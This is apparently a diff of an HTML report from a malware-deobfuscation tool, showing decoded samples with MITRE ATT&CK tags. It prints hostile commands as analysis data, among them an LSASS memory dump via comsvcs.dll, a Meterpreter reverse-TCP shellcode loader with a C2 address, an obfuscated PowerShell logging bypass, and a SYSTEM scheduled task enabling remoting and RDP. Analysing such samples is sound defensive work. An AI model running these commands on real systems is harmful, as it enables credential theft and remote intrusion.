-<span class="badge chain">978 chars</span></div>
+<div class="section"><span class="section-title">Decoded Output (first 1200 chars)</span><pre>==gMyUSZ4VmLlJXY3xWYtNUNlUjMlAVTFRVNyUCMyUiNyUiNyUCMyUSZ4VmLlJXY3xWYtNUNlUjMlAVTFRVNyUCMyUSZ4VmLlJXY3xWYtie5hnLslmdl9yLBNTJwRHdoBjMlYWLwITJ0lGbwNXLwITJlh2YhNGbyVXLwITJlhXZuwWa0VHdyV2YyITJwITJj9CMyUSZtFmTwITJ0NWZqJ2TtQ3YlxWZTBjMlM0NlAjMlM3gMyUSZ4VmLk12Y</pre></div></div>
+<div class="case suspicious"><div class="name">#9 · Error3</div>
+<div style="margin:8px 0"><span class="badge b-sus">SUSPICIOUS · score 100</span><span class="badge chain">archetype:PS_EncodedCommand+PS_HEXFAMILY_UNIFIED_OBFUSCATION</span><span class="badge chain">978 chars</span></div>
 <div class="section"><span class="section-title">Chain (7 steps)</span><br>
 <span class="badge chain">extract-b64</span>
 <span class="badge chain">utf16le-or-utf8-decode</span>
@@ -290,7 +263,7 @@ urlcache -f http://10.200.49.6:8080/FR-X2XmSY2X4F0ivU4nTYw C:\Users\SP_APP~1\App
 <span class="badge chain">base64-decode</span>
 <span class="badge chain">utf16le-or-utf8-decode</span>
 </div>
-<div class="section"><span class="section-title">MITRE ATT&CK (4)</span><br>
+<div class="section"><span class="section-title">MITRE ATT&amp;CK (4)</span><br>
 <span class="badge mitre">T1059.001</span>
 <span class="badge mitre">T1027.010</span>
 <span class="badge mitre">T1057</span>
@@ -300,11 +273,9 @@ urlcache -f http://10.200.49.6:8080/FR-X2XmSY2X4F0ivU4nTYw C:\Users\SP_APP~1\App
 <span class="badge lol">powershell.exe</span>
 </div>
 <div class="section"><span class="section-title">Input (first 400 chars)</span><pre>powershell.exe -e ZDN4XDk0eFxhNnhcZDR4XGM2eFw5NXhcMzV4XDM2eFxhNnhcNTN4XDk3eFwzNnhcYTZ4XDkzeFxkNnhcMzZ4XDc3eFxlNHhcNTV4XGU0eFxjNHhcMTR4XDY1eFw0NXhcNjR4XDI1eFw2NXhcMTV4XGE3eFw1NXhcOTZ4XDQ2eFw1N3hcNjV4XDc0eFxlNHhcOTd4XDU1eFwzNHhcZDR4XDk3eFw1NXhcOTZ4XDQ2eFxhY3hcZTR4XDU1eFxjNHhcMDN4XGE0eFwzM3hcMjZ4XDc3eFw4NnhcODV4XDI1eFw3N3hcOTR4XDQ1eFxhNHhcNDR4XDQ2eFw0NXhcYTR4XDc3eFw5NHhcNDV4XGE0eFxiNnhcYzZ4XDU0eFxkNH …</pre></div>
-<div class="section"><span class="section-title">Decoded Output (first 800 chars)</span><pre>powershell -ep bypass -c &quot;Get-Process | Select-Object Name, Id | Export-C]�L�	L�[��L�UST�P����˘�I�L</pre></div></div>
-<div class="case suspicious"><div class="name">#11 · Error2</div>
-<div style="margin:8px 0"><span class="badge b-sus">SUSPICIOUS · score 100</span>
-<span class="badge chain">archetype:PS_EncodedCommand+PS_HEXFAMILY_UNIFIED_OBFUSCATION</span>
-<span class="badge chain">426 chars</span></div>
+<div class="section"><span class="section-title">Decoded Output (first 1200 chars)</span><pre>powershell -ep bypass -c &quot;Get-Process | Select-Object Name, Id | Export-C]�L�	L�[��L�UST�P����˘�I�L</pre></div></div>
+<div class="case suspicious"><div class="name">#10 · Error2</div>
+<div style="margin:8px 0"><span class="badge b-sus">SUSPICIOUS · score 100</span><span class="badge chain">archetype:PS_EncodedCommand+PS_HEXFAMILY_UNIFIED_OBFUSCATION+BLIND_XOR</span><span class="badge chain">426 chars</span></div>
 <div class="section"><span class="section-title">Chain (9 steps)</span><br>
 <span class="badge chain">extract-b64</span>
 <span class="badge chain">utf16le-or-utf8-decode</span>
@@ -316,7 +287,7 @@ urlcache -f http://10.200.49.6:8080/FR-X2XmSY2X4F0ivU4nTYw C:\Users\SP_APP~1\App
 <span class="badge chain">hex-or-b64-decode</span>
 <span class="badge chain">xor-bruteforce-256</span>
 </div>
-<div class="section"><span class="section-title">MITRE ATT&CK (3)</span><br>
+<div class="section"><span class="section-title">MITRE ATT&amp;CK (3)</span><br>
 <span class="badge mitre">T1059.001</span>
 <span class="badge mitre">T1027.010</span>
 <span class="badge mitre">T1027</span>
@@ -326,23 +297,54 @@ urlcache -f http://10.200.49.6:8080/FR-X2XmSY2X4F0ivU4nTYw C:\Users\SP_APP~1\App
 </div>
 <div class="section"><span class="section-title">IOCs</span><br><span class="stat">sha256=1</span></div>
 <div class="section"><span class="section-title">Input (first 400 chars)</span><pre>powershell.exe -e XGs1OVxrNnFcazQ2XGs3blxrNjFcazQzXGs1NVxrNzlcazRxXGs0M1xrMzFcazcwXGs0blxrNTRcazQ5XGs3N1xrNG5cazU0XGs0clxrNDZcazRuXGs1NFxrNDlcazMyXGs0blxrNTRcazQ5XGs3N1xrNHBcazMyXGs1MlxrNnBcazY0XGs2OVxrMzlcazMwXGs1OVxrMzNcazQxXGs3NlxrNHFcazU0XGs0MVxrNzVcazRxXGs1NFxrNDFcazc1XGs0cVxrNTRcazQxXGs3NVxrNHFcazU0XGs0MVxrNzYcazRyXGs0NFxrNTFcazMwXGs0clxrNDNcazU1XGs3OVxrNHFcazQ0XGs0MVxrNnBcazRxXGszMFxrNTVcaz …</pre></div>
-<div class="section"><span class="section-title">Decoded Output (first 800 chars)</span><pre>──── BLIND_XOR_SINGLE_BYTE (v1.2.0) ────
+<div class="section"><span class="section-title">Decoded Output (first 1200 chars)</span><pre>──── BLIND_XOR_SINGLE_BYTE (v1.2.0) ────
 Input encoding : base64
 Raw bytes      : 55
 XOR key found  : 0x40  (score 1.24 · baseline 0.84)
 First 32 bytes : 2211332865726c6d296572706573456572766572706b2424366f3423306f6d70
 Decoded (ASCII):
 &quot;3(erlm)erpesEerverpk$$6o4#0ompnmpnmpnmpLMMLI�LIK�	K�</pre></div></div>
+<div class="case suspicious"><div class="name">#11 · Need_Evaluation on OUTPUT</div>
+<div style="margin:8px 0"><span class="badge b-sus">SUSPICIOUS · score 98</span><span class="badge chain">magic</span><span class="badge chain">1170 chars</span></div>
+<div class="section"><span class="section-title">Chain (3 steps)</span><br>
+<span class="badge chain">extract-payload</span>
+<span class="badge chain">base64-decode</span>
+<span class="badge chain">xor-brute</span>
+</div>
+<div class="section"><span class="section-title">MITRE ATT&amp;CK (4)</span><br>
+<span class="badge mitre">T1140</span>
+<span class="badge mitre">T1027</span>
+<span class="badge mitre">T1055</span>
+<span class="badge mitre">T1620</span>
+</div>
+<div class="section"><span class="section-title">IOCs</span><br><span class="stat">ips=1 · emails=1</span></div>
+<div class="section"><span class="section-title">Input (first 400 chars)</span><pre>[Byte[]]$var_code = [System.Convert]::FromBase64String(&#x27;38uqIyMjQ6rGEvFHqHETqHEvqHE3qFELLJRpBRLcEuOPH0JfIQ8D4uwuIuTB03F0qHEzqGEfIvOoY1um41dpIvNzqGs7qHsDIvDAH2qoF6gi9RLcEuOP4uwuIuQbw1bXIF7bGF4HVsF7qHsHIvBFqC9oqHs/IvCoJ6gi86pnBwd4eEJ6eXLcw3t8eagxyKV+S01GVyNLVEpNSndLb1QFJNz2yyMjIyMS3HR0dHR0Sxl1WoTc9sqHIyMjeBLqcnJJIHJyS5giIyNwc0t0qrzl3PZzyq8jIyN4EvFxSyMR46dxcXFwcXNLyHYNGNz2quWg4HNLoxAjI6rDSSdzSTx1S1Zl …</pre></div>
+<div class="section"><span class="section-title">Decoded Output (first 1200 chars)</span><pre># ─── Shellcode Detected: Metasploit Meterpreter (reverse_tcp/https · x86 stager) ───
+# Arch    : x86_64 · Size: 833B · Entropy: 7.151
+# MITRE   : T1071.001
+# UA      : User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; BOIE9;PTBR)
+# IPs     : 149.28.81.19
+#
+# Hex dump (first 128 bytes):
+  00000000  fc e8 89 00 00 00 60 89 e5 31 d2 64 8b 52 30 8b   |......`..1.d.R0.|
+  00000010  52 0c 8b 52 14 8b 72 28 0f b7 4a 26 31 ff 31 c0   |R..R..r(..J&amp;1.1.|
+  00000020  ac 3c 61 7c 02 2c 20 c1 cf 0d 01 c7 e2 f0 52 57   |.&lt;a|., .......RW|
+  00000030  8b 52 10 8b 42 3c 01 d0 8b 40 78 85 c0 74 4a 01   |.R..B&lt;...@x..tJ.|
+  00000040  d0 50 8b 48 18 8b 58 20 01 d3 e3 3c 49 8b 34 8b   |.P.H..X ...&lt;I.4.|
+  00000050  01 d6 31 ff 31 c0 ac c1 cf 0d 01 c7 38 e0 75 f4   |..1.1.......8.u.|
+  00000060  03 7d f8 3b 7d 24 75 e2 58 8b 58 24 01 d3 66 8b   |.}.;}$u.X.X$..f.|
+  00000070  0c 4b 8b 58 1c 01 d3 8b 04 8b 01 d0 89 44 24 24   |.K.X.........D$$|
+  … (705 more bytes truncated)
+#
+# Recommendation: extract raw bytes → run through `speakeasy` or `scdbg` for full behavioural analysis. If Meterpreter/Cobalt Strike, extract the C2 config with `1768` or `dissect.cobaltstrike`.</pre></div></div>
 <div class="case suspicious"><div class="name">#12 · GoodOne</div>
-<div style="margin:8px 0"><span class="badge b-sus">SUSPICIOUS · score 71</span>
-<span class="badge chain">magic</span>
-<span class="badge chain">2010 chars</span></div>
+<div style="margin:8px 0"><span class="badge b-sus">SUSPICIOUS · score 71</span><span class="badge chain">magic</span><span class="badge chain">2010 chars</span></div>
 <div class="section"><span class="section-title">Chain (3 steps)</span><br>
 <span class="badge chain">extract-payload</span>
 <span class="badge chain">base64-decode</span>
 <span class="badge chain">utf16le-decode</span>
 </div>
-<div class="section"><span class="section-title">MITRE ATT&CK (9)</span><br>
+<div class="section"><span class="section-title">MITRE ATT&amp;CK (9)</span><br>
 <span class="badge mitre">T1003.001</span>
 <span class="badge mitre">T1218.011</span>
 <span class="badge mitre">T1059.001</span>
@@ -362,17 +364,15 @@ Decoded (ASCII):
         &quot;-Embedding&quot;,
         &quot;-NoP -Enc cgB1AG4AZABsAGwAMwAyAC4AZQB4AGUAIABDADoAXABXAGkAbgBkAG8AdwBzAFwAUwB5AHMAdABlAG0AMwAyAFwAYwBvAG0AcwB2AGMAcwAuAGQAbABsACwAIABgACMAKwAwADAAMAAwADIANAAgACgARwBlAHQALQBQAHIAbwBjAGUAcwBzACAAbABzAGEAcwBzACkALgBJAGQAIABcAFcAaQBuAGQAbwB3AHMAXABUAGUAbQBwAFwANQBQAFkATgAuAG8AZAB0ACAAZgB1AGwAbAA=&quot;,
         &quot;-NoP -Enc cgB1AG4AZABsAGwAMwAyAC4AZQB4AGUAIABDADoAXABXAGkAbg …</pre></div>
-<div class="section"><span class="section-title">Decoded Output (first 800 chars)</span><pre>rundll32.exe C:\Windows\System32\comsvcs.dll, `#+000024 (Get-Process lsass).Id \Windows\Temp\waOowOZ.rct full</pre></div></div>
+<div class="section"><span class="section-title">Decoded Output (first 1200 chars)</span><pre>rundll32.exe C:\Windows\System32\comsvcs.dll, `#+000024 (Get-Process lsass).Id \Windows\Temp\waOowOZ.rct full</pre></div></div>
 <div class="case suspicious"><div class="name">#13 · Case2</div>
-<div style="margin:8px 0"><span class="badge b-sus">SUSPICIOUS · score 45</span>
-<span class="badge chain">archetype:PS_EncodedCommand+magic</span>
-<span class="badge chain">4188 chars</span></div>
+<div style="margin:8px 0"><span class="badge b-sus">SUSPICIOUS · score 45</span><span class="badge chain">archetype:PS_EncodedCommand+magic</span><span class="badge chain">4188 chars</span></div>
 <div class="section"><span class="section-title">Chain (3 steps)</span><br>
 <span class="badge chain">extract-b64</span>
 <span class="badge chain">utf16le-or-utf8-decode</span>
 <span class="badge chain">extract-payload</span>
 </div>
-<div class="section"><span class="section-title">MITRE ATT&CK (4)</span><br>
+<div class="section"><span class="section-title">MITRE ATT&amp;CK (4)</span><br>
 <span class="badge mitre">T1059.001</span>
 <span class="badge mitre">T1027.010</span>
 <span class="badge mitre">T1059.003</span>
@@ -388,64 +388,56 @@ C:\WINDOWS\system32\cmd.exe /C C:\temp\temp\1.exe C:\temp\temp\2.dll
 TDdmZZQkkW0vnh3fyzO66xnGPtBx1zpJkklIcmY9nwuHiyTwFOJ/PnSX0sGSltQbjiY/Qt+DDxngJZwi5TybUPFGaXkIbRdyJw9lSfID0NoefHw9C/JAirGhJnor0RY1bjL5HMpe3AJo/ym+mMPhlQ0DlC0L8lRfEHFlD1jYkSUja+8qjGId/zeN6J5gXLIYPvHm/Kk2quUcUAHC9ZIUpxJk+OkKWstSv3t4YOJtp5lMI6raWpN5GB0EbicU4pT62syHxZaD
 
 powershell.exe -NonInterac …</pre></div>
-<div class="section"><span class="section-title">Decoded Output (first 800 chars)</span><pre>gMe+uaPuYdmH8mPJ0SboFA==</pre></div></div>
+<div class="section"><span class="section-title">Decoded Output (first 1200 chars)</span><pre>gMe+uaPuYdmH8mPJ0SboFA==</pre></div></div>
 <div class="case corrupted"><div class="name">#14 · Corrupted_Gzip</div>
-<div style="margin:8px 0"><span class="badge b-cor">CORRUPTED · score 0</span>
-<span class="badge chain">smart+magic</span>
-<span class="badge chain">3671 chars</span></div>
+<div style="margin:8px 0"><span class="badge b-cor">CORRUPTED · score 0</span><span class="badge chain">smart+magic</span><span class="badge chain">3671 chars</span></div>
 <div class="section"><span class="section-title">Chain (3 steps)</span><br>
 <span class="badge chain">extract-b64-concat</span>
 <span class="badge chain">base64-decode</span>
 <span class="badge chain">gzip-decompress</span>
 </div>
-<div class="section"><span class="section-title">MITRE ATT&CK (2)</span><br>
+<div class="section"><span class="section-title">MITRE ATT&amp;CK (2)</span><br>
 <span class="badge mitre">T1059.001</span>
 <span class="badge mitre">T1140</span>
 </div>
 <div class="section"><span class="section-title">IOCs</span><br><span class="stat">domains=1</span></div>
 <div class="section"><span class="section-title">Input (first 400 chars)</span><pre>&quot;-noni -nop -w hidden -c $smrA=((&#x27;&#x27;+&#x27;E&#x27;+&#x27;n{0}b&#x27;+&#x27;leSc&#x27;+&#x27;ri{2&#x27;+&#x27;}tBloc{3}{1}ogging&#x27;)-f&#x27;a&#x27;,&#x27;L&#x27;,&#x27;p&#x27;,&#x27;k&#x27;);If($PSVersionTable.PSVersion.Major -ge 3){ $fLW8W=((&#x27;Sc&#x27;+&#x27;ri&#x27;+&#x27;pt{0}{2}ock&#x27;+&#x27;Log&#x27;+&#x27;gi{1}g&#x27;)-f&#x27;B&#x27;,&#x27;n&#x27;,&#x27;l&#x27;); $zeXlF=[Ref].Assembly.GetType(((&#x27;{&#x27;+&#x27;2}{&#x27;+&#x27;3}stem&#x27;+&#x27;.Ma&#x27;+&#x27;na{1}&#x27;+&#x27;e&#x27;+&#x27;ment.{4}{0}tomation.&#x27;+&#x27;Uti{5}s&#x27;)-f&#x27;u&#x27;,&#x27;g&#x27;,&#x27;S&#x27;,&#x27;y&#x27;,&#x27;A&#x27;,&#x27;l&#x27;)); $sUr=[Collections.Generic.Dictionary[string,System.Object]]: …</pre></div>
-<div class="section"><span class="section-title">Decoded Output (first 800 chars)</span><pre>[GZIP_CORRUPT] error: Error -3 while decompressing data: invalid bit length repeat — aggressive salvage disabled.</pre></div></div>
+<div class="section"><span class="section-title">Decoded Output (first 1200 chars)</span><pre>[GZIP_CORRUPT] error: Error -3 while decompressing data: invalid bit length repeat — aggressive salvage disabled.</pre></div></div>
 <div class="case corrupted"><div class="name">#15 · Need Layered Detonation</div>
-<div style="margin:8px 0"><span class="badge b-cor">CORRUPTED · score 0</span>
-<span class="badge chain">smart+magic</span>
-<span class="badge chain">3671 chars</span></div>
+<div style="margin:8px 0"><span class="badge b-cor">CORRUPTED · score 0</span><span class="badge chain">smart+magic</span><span class="badge chain">3671 chars</span></div>
 <div class="section"><span class="section-title">Chain (3 steps)</span><br>
 <span class="badge chain">extract-b64-concat</span>
 <span class="badge chain">base64-decode</span>
 <span class="badge chain">gzip-decompress</span>
 </div>
-<div class="section"><span class="section-title">MITRE ATT&CK (2)</span><br>
+<div class="section"><span class="section-title">MITRE ATT&amp;CK (2)</span><br>
 <span class="badge mitre">T1059.001</span>
 <span class="badge mitre">T1140</span>
 </div>
 <div class="section"><span class="section-title">IOCs</span><br><span class="stat">domains=1</span></div>
 <div class="section"><span class="section-title">Input (first 400 chars)</span><pre>&quot;-noni -nop -w hidden -c $smrA=((&#x27;&#x27;+&#x27;E&#x27;+&#x27;n{0}b&#x27;+&#x27;leSc&#x27;+&#x27;ri{2&#x27;+&#x27;}tBloc{3}{1}ogging&#x27;)-f&#x27;a&#x27;,&#x27;L&#x27;,&#x27;p&#x27;,&#x27;k&#x27;);If($PSVersionTable.PSVersion.Major -ge 3){ $fLW8W=((&#x27;Sc&#x27;+&#x27;ri&#x27;+&#x27;pt{0}{2}ock&#x27;+&#x27;Log&#x27;+&#x27;gi{1}g&#x27;)-f&#x27;B&#x27;,&#x27;n&#x27;,&#x27;l&#x27;); $zeXlF=[Ref].Assembly.GetType(((&#x27;{&#x27;+&#x27;2}{&#x27;+&#x27;3}stem&#x27;+&#x27;.Ma&#x27;+&#x27;na{1}&#x27;+&#x27;e&#x27;+&#x27;ment.{4}{0}tomation.&#x27;+&#x27;Uti{5}s&#x27;)-f&#x27;u&#x27;,&#x27;g&#x27;,&#x27;S&#x27;,&#x27;y&#x27;,&#x27;A&#x27;,&#x27;l&#x27;)); $sUr=[Collections.Generic.Dictionary[string,System.Object]]: …</pre></div>
-<div class="section"><span class="section-title">Decoded Output (first 800 chars)</span><pre>[GZIP_CORRUPT] error: Error -3 while decompressing data: invalid bit length repeat — aggressive salvage disabled.</pre></div></div>
+<div class="section"><span class="section-title">Decoded Output (first 1200 chars)</span><pre>[GZIP_CORRUPT] error: Error -3 while decompressing data: invalid bit length repeat — aggressive salvage disabled.</pre></div></div>
 <div class="case undecoded"><div class="name">#16 · Test Case</div>
-<div style="margin:8px 0"><span class="badge b-unk">UNDECODED · score 75</span>
-<span class="badge chain">magic</span>
-<span class="badge chain">17 chars</span></div>
+<div style="margin:8px 0"><span class="badge b-unk">UNDECODED · score 75</span><span class="badge chain">magic</span><span class="badge chain">17 chars</span></div>
 <div class="section"><span class="section-title">Chain (0 steps)</span><br>
 </div>
-<div class="section"><span class="section-title">MITRE ATT&CK (1)</span><br>
+<div class="section"><span class="section-title">MITRE ATT&amp;CK (1)</span><br>
 <span class="badge mitre">T1059.001</span>
 </div>
 <div class="section"><span class="section-title">LOLBins</span><br>
 <span class="badge lol">powershell.exe</span>
 </div>
 <div class="section"><span class="section-title">Input (first 400 chars)</span><pre>powershell -e ABC</pre></div>
-<div class="section"><span class="section-title">Decoded Output (first 800 chars)</span><pre></pre></div></div>
+<div class="section"><span class="section-title">Decoded Output (first 1200 chars)</span><pre></pre></div></div>
 <div class="case undecoded"><div class="name">#17 · Case1</div>
-<div style="margin:8px 0"><span class="badge b-unk">UNDECODED · score 64</span>
-<span class="badge chain">magic</span>
-<span class="badge chain">211 chars</span></div>
+<div style="margin:8px 0"><span class="badge b-unk">UNDECODED · score 64</span><span class="badge chain">magic</span><span class="badge chain">211 chars</span></div>
 <div class="section"><span class="section-title">Chain (0 steps)</span><br>
 </div>
-<div class="section"><span class="section-title">MITRE ATT&CK (1)</span><br>
+<div class="section"><span class="section-title">MITRE ATT&amp;CK (1)</span><br>
 <span class="badge mitre">T1021.006</span>
 </div>
 <div class="section"><span class="section-title">IOCs</span><br><span class="stat">domains=1</span></div>
 <div class="section"><span class="section-title">Input (first 400 chars)</span><pre>/s vmch45.sugarlandtx.gov /tn MsedgeUpdate /tr \&quot;powershell.exe Enable-PSRemoting -force\&quot; /sc ONCE /st 00:00 /ru SYSTEM
 /f, advfirewall firewall add rule name=RDP protocol=TCP localport=3389 action=allow dir=IN</pre></div>
-<div class="section"><span class="section-title">Decoded Output (first 800 chars)</span><pre></pre></div></div>
+<div class="section"><span class="section-title">Decoded Output (first 1200 chars)</span><pre></pre></div></div>
 </body></html>
